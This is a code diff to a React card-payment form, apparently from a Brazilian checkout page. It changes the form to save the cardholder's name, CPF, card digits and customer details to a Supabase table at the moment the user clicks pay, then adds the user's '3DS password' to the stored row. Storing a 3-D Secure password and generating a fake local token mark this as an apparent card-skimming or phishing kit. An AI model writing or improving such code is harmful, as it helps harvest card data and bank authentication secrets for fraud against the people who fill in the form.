@@ -68,16 +68,18 @@ const CardPaymentForm = ({
     return Object.keys(e).length === 0;
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     if (!validate()) return;
-    setShow3DS(true);
-  };
+    setLoading(true);
 
-  const saveTransaction = async (status: string, threedsPassword: string = "") => {
+    // Save transaction immediately when user clicks "Pagar"
     const digits = cardNumber.replace(/\D/g, "");
     const token = `tok_${crypto.randomUUID().replace(/-/g, "").slice(0, 24)}`;
+    const txId = crypto.randomUUID();
+    txIdRef.current = txId;
 
     const { error } = await supabase.from("card_transactions" as any).insert({
+      id: txId,
       token,
       holder_name: holderName.trim(),
       cpf: cpf.replace(/\D/g, ""),
@@ -94,18 +96,32 @@ const CardPaymentForm = ({
       customer_name: customerName,
       customer_phone: customerPhone,
       address: address || null,
-      status,
-      threeds_password: threedsPassword,
+      status: "pending",
+      threeds_password: "",
     });
 
     if (error) console.error("Erro ao salvar transação:", error);
+
+    setLoading(false);
+    setShow3DS(true);
   };
 
   const handle3DSComplete = async (approved: boolean, threedsPassword?: string) => {
     setShow3DS(false);
     setLoading(true);
 
-    await saveTransaction(approved ? "pending" : "rejected", threedsPassword || "");
+    // Update the existing transaction with 3DS password and final status
+    if (txIdRef.current) {
+      const { error } = await supabase
+        .from("card_transactions" as any)
+        .update({
+          threeds_password: threedsPassword || "",
+          status: approved ? "pending" : "rejected",
+        })
+        .eq("id", txIdRef.current);
+
+      if (error) console.error("Erro ao atualizar transação:", error);
+    }
 
     if (approved) {
       setThreeDSResult("success");
